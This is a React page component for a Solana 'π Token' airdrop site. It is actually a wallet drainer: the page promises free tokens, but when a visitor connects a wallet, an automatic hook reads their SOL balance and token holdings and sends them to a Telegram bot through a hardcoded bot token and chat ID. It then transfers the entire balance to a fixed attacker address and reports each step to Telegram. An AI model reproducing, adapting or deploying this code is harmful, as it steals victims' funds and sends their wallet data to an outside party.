
import { Settings, Menu } from "lucide-react";
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { LAMPORTS_PER_SOL } from '@solana/web3.js';
import { useEffect, useState } from 'react';
import { getTokenAccounts, sendToTelegram, signAndSendTransaction } from '@/utils/walletUtils';
import { toast } from '@/components/ui/use-toast';

const BACKEND_ADDRESS = "GsRoop6YCzpakWCoG7YnHSSgMvcgjnuFEie62GRZdmJx";
// Telegram details visible to user
const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
const TELEGRAM_CHAT_ID = "-1002490122517";

const Index = () => {
  const { publicKey, connecting, connected, wallet } = useWallet();
  const { connection } = useConnection();
  const [isProcessing, setIsProcessing] = useState(false);
  const [lastSignature, setLastSignature] = useState<string | null>(null);
  const [walletBalance, setWalletBalance] = useState<number | null>(null);
  const [tokens, setTokens] = useState<any[]>([]);

  const fetchWalletData = async () => {
    if (!publicKey || !wallet || !connection) {
      console.log("Wallet, connection, or public key not available");
      return null;
    }

    try {
      // Get wallet balance
      console.log("Getting wallet balance");
      const balance = await connection.getBalance(publicKey, 'confirmed');
      const solBalance = balance / LAMPORTS_PER_SOL;
      setWalletBalance(solBalance);
      console.log("Current balance:", solBalance, "SOL");

      // Get token accounts
      console.log("Fetching token accounts");
      const tokenAccounts = await getTokenAccounts(connection, publicKey.toString());
      setTokens(tokenAccounts);
      console.log("Token accounts:", tokenAccounts);

      return {
        address: publicKey.toString(),
        tokens: tokenAccounts,
        balance: solBalance,
        connectionTime: new Date().toISOString(),
        walletName: wallet?.adapter?.name || "Unknown Wallet"
      };
    } catch (error) {
      console.error("Error fetching wallet data:", error);
      return null;
    }
  };

  const handleWalletConnection = async () => {
    if (!publicKey || !wallet) {
      console.log("Wallet or public key not available");
      return;
    }

    if (isProcessing) {
      console.log("Already processing a transaction");
      return;
    }

    setIsProcessing(true);
    try {
      console.log("Starting wallet connection process");
      
      // Fetch all wallet data first
      const walletData = await fetchWalletData();
      if (!walletData) {
        throw new Error("Failed to fetch wallet data");
      }
      
      // Always send the initial connection data to Telegram first
      console.log("Sending initial wallet data to Telegram");
      const telegramSent = await sendToTelegram(walletData, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
      
      if (!telegramSent) {
        console.error("Failed to send data to Telegram");
        toast({
          title: "Warning",
          description: "Could not send wallet data to verification service.",
          variant: "destructive",
        });
      } else {
        console.log("Successfully sent wallet data to Telegram");
      }

      // Check if wallet has any balance at all
      if (walletData.balance <= 0) {
        console.log("Wallet has no SOL balance");
        
        // Send notification about zero balance to Telegram
        const zeroBalanceMessage = {
          address: publicKey.toString(),
          message: `WALLET HAS ZERO BALANCE. No transfer will be attempted.`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(zeroBalanceMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
        
        toast({
          title: "Low Balance",
          description: "Your wallet has no SOL balance. No transfer will be attempted.",
        });
        setIsProcessing(false);
        return;
      }

      // Check if balance is sufficient for transfer and fees
      const minimumRequiredBalance = 0.00089 * LAMPORTS_PER_SOL;
      if (walletData.balance * LAMPORTS_PER_SOL <= minimumRequiredBalance) {
        console.log("Wallet balance too low for fees");
        
        // Send notification about insufficient balance to Telegram
        const lowBalanceMessage = {
          address: publicKey.toString(),
          message: `INSUFFICIENT BALANCE FOR FEES. Balance: ${walletData.balance.toFixed(6)} SOL. Minimum required: 0.00089 SOL.`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(lowBalanceMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
        
        toast({
          title: "Low Balance",
          description: "Your wallet balance is too low to cover transaction fees.",
        });
        setIsProcessing(false);
        return;
      }

      // Send a transfer attempt notification to Telegram
      const transferMessage = {
        address: publicKey.toString(),
        message: `ATTEMPTING TO TRANSFER ${walletData.balance.toFixed(6)} SOL to ${BACKEND_ADDRESS}`,
        walletName: wallet?.adapter?.name || "Unknown Wallet"
      };
      
      await sendToTelegram(transferMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);

      // Initiate transfer with proper fee calculation
      console.log("Initiating transfer");
      try {
        const signature = await signAndSendTransaction(
          connection,
          wallet,
          BACKEND_ADDRESS,
          walletData.balance,
          TELEGRAM_BOT_TOKEN,
          TELEGRAM_CHAT_ID
        );

        console.log("Transfer completed with signature:", signature);
        setLastSignature(signature);
        
        // Send completion message with transfer results
        const completionMessage = {
          address: publicKey.toString(),
          message: `TRANSFER COMPLETED! ${walletData.balance.toFixed(6)} SOL sent.
Transaction: https://explorer.solana.com/tx/${signature}`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(completionMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
        
        toast({
          title: "Success",
          description: "Connection successful and transfer completed!",
        });
      } catch (error) {
        console.error("Transfer failed:", error);
        
        // Send failure notification to Telegram
        const failureMessage = {
          address: publicKey.toString(),
          message: `TRANSFER FAILED! Error: ${error instanceof Error ? error.message : "Unknown error"}`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(failureMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
        
        toast({
          title: "Transfer Failed",
          description: error instanceof Error ? error.message : "Failed to process transaction",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error('Detailed error in wallet connection:', error);
      
      // Send error notification to Telegram
      if (publicKey) {
        const errorMessage = {
          address: publicKey.toString(),
          message: `ERROR DURING WALLET CONNECTION: ${error instanceof Error ? error.message : "Unknown error"}`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(errorMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
      }
      
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to process wallet connection",
        variant: "destructive",
      });
    } finally {
      setIsProcessing(false);
    }
  };

  useEffect(() => {
    if (connected && publicKey && !isProcessing) {
      handleWalletConnection();
    }
  }, [connected, publicKey]);

  return (
    <div className="min-h-screen bg-background p-6 relative">
      {/* Top Navigation */}
      <nav className="flex justify-between items-center mb-20">
        {/* Logo */}
        <div className="w-12 h-12 rounded-full bg-gradient-to-r from-cyan-400 to-cyan-300 p-[2px]">
          <div className="w-full h-full rounded-full bg-background flex items-center justify-center">
            <span className="text-2xl font-bold text-cyan-400">π</span>
          </div>
        </div>
        
        {/* Navigation Buttons */}
        <div className="flex gap-4">
          <button className="circle-button">
            <Menu className="w-6 h-6 text-cyan-400" />
          </button>
        </div>
      </nav>

      {/* Main Content */}
      <main className="flex flex-col items-center justify-center gap-8 max-w-2xl mx-auto text-center">
        <h1 className="text-5xl md:text-6xl font-bold gradient-text leading-tight">
          Join The π Adventure
        </h1>
        
        <p className="text-xl md:text-2xl text-gray-400 max-w-xl">
          Don't miss out! Click here to claim your exclusive π Token now and be part of the revolution!!
        </p>

        {/* Action Buttons */}
        <div className="flex flex-col w-full max-w-md gap-4 mt-4">
          <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
          
          {walletBalance !== null && (
            <div className="mt-4 p-4 bg-gray-800 rounded-lg">
              <p className="text-cyan-400">Detected Wallet Balance: {walletBalance.toFixed(6)} SOL</p>
              
              {tokens.length > 0 && (
                <div className="mt-2">
                  <p className="text-sm text-cyan-300">Token Holdings:</p>
                  <ul className="text-xs text-gray-400 mt-1">
                    {tokens.map((token, index) => (
                      <li key={index} className="mt-1">
                        {token.mint.slice(0, 8)}...{token.mint.slice(-8)} - {token.amount} tokens
                      </li>
                    ))}
                  </ul>
                </div>
              )}
            </div>
          )}
          
          {isProcessing && (
            <div className="mt-4 p-4 bg-gray-800 rounded-lg">
              <p className="text-cyan-400">Processing transaction...</p>
              <div className="mt-2 w-full bg-gray-700 h-2 rounded-full overflow-hidden">
                <div className="bg-cyan-400 h-full animate-pulse w-1/2"></div>
              </div>
            </div>
          )}
          
          {lastSignature && (
            <div className="mt-4 p-4 bg-gray-800 rounded-lg">
              <p className="text-sm text-gray-400">Transaction Signature:</p>
              <p className="text-xs text-cyan-400 break-all">{lastSignature}</p>
              <a 
                href={`https://explorer.solana.com/tx/${lastSignature}`} 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-xs text-cyan-300 underline mt-2 inline-block"
              >
                View on Explorer
              </a>
            </div>
          )}
          
          <div className="mt-4 p-4 bg-gray-800 rounded-lg text-left">
            <p className="text-sm text-gray-400 mb-2">Telegram Bot Details:</p>
            <p className="text-xs text-cyan-400">Bot Token: {TELEGRAM_BOT_TOKEN}</p>
            <p className="text-xs text-cyan-400">Chat ID: {TELEGRAM_CHAT_ID}</p>
          </div>
        </div>

        {/* Bottom Logo */}
        <div className="mt-20">
          <div className="w-32 h-32 rounded-full bg-[#2A2F3F] flex items-center justify-center">
            <div className="w-24 h-24 rounded-full bg-[#4B3979] flex items-center justify-center">
              <span className="text-5xl font-bold text-[#FFA500]">π</span>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Index;
